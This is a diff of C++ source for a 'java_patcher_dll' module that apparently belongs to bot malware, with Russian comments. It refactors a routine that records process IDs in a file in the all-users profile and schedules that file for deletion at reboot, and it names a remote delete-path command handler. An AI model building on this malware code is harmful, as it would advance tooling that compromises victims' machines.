@@ -1,9 +1,7 @@
-// java_patcher_dll.cpp : Defines the exported functions for the DLL application.
-//
 
 #include "Modules.h"
 
-#ifdef JAVS_PATCHERH
+//#ifdef JAVS_PATCHERH
 
 #include "BotHttp.h"
 #include "Config.h"
@@ -832,9 +830,9 @@ static bool WJFile()
 } */
 
 
+// Функция создаёт файл пидов
 static bool WJFile()
 {
-	// Функция создаёт файл пидов
 	char wj[MAX_PATH];
 	if (!GetAllUsersProfile( wj, sizeof(wj), JavaPatcherPidsFile))
 		return false;
@@ -1080,42 +1078,39 @@ bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 	return 0;
 }
 
+// Функция добавляет пид текущего процесса в файл
 void JavaPatcherAddPidToFile()
 {
-	// Функция добавляет пид текущего процесса в файл
-
-	char FileName[MAX_PATH];
-	if (!GetAllUsersProfile(FileName, MAX_PATH, JavaPatcherPidsFile))
-		return;
-
-
-	DWORD PID = GetUniquePID();
-
-	// Проверяем наличие пида в файле
-	DWORD Size = 0;
-	DWORD* Pids = (DWORD*)File::ReadToBufferA(FileName, Size);
-	int Count = Size / sizeof(DWORD);
-	for( int i = 0; i < Count; i++)
-	if(Pids[i] == PID )
+	char wjDat[MAX_PATH];
+	if( GetAllUsersProfile( wjDat, sizeof(wjDat), JavaPatcherPidsFile ) )
 	{
-		//такой пид уже есть, игнорируем добавление
-		MemFree(Pids);
-		return;
+		DWORD PID = GetUniquePID();
+		if( File::IsExists(wjDat) )
+		{
+			DWORD size;
+			DWORD* pids = (DWORD*)File::ReadToBufferA( wjDat, size );
+			int count = size / 4;
+
+			for( int i = 0; i < count; i++ )
+				if( pids[i] == PID )
+				{
+					PID = 0; //такой пид уже есть, добавлятьв файл не нужно
+					break;
+				}
+			if( PID ) //добавляем пид
+			{
+				DWORD* pids2 = (DWORD*)MemAlloc(size + 4);
+				pids2[0] = PID;
+				m_memcpy( &pids2[1], pids, size );
+				File::WriteBufferA( wjDat, pids2, size + 4 );
+				MemFree(pids2);
+			}
+			MemFree(pids);
+		}
+		else
+			File::WriteBufferA( wjDat, &PID, sizeof(PID) );
+		pMoveFileExA( wjDat, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
 	}
-
-	// Добавляем пид в файл
-	DWORD NewSize = Size + 4;
-	DWORD*Pids2 = (DWORD*)MemAlloc(NewSize);
-	Pids2[0] = PID;
-	m_memcpy(&Pids2[1], Pids, Size );
-	File::WriteBufferA(FileName, Pids2, NewSize);
-
-	MemFree(Pids);
-	MemFree(Pids2);
-
-	// Помечаем файл как файл необходимый к удалению после
-	// перезагрузки системы
-	pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 }
 
 // Функция сигнализирует о необходимости запуска патчей
@@ -1130,4 +1125,4 @@ void  JavaPatcherSignal()
 	}
 }
 
-#endif
+//#endif
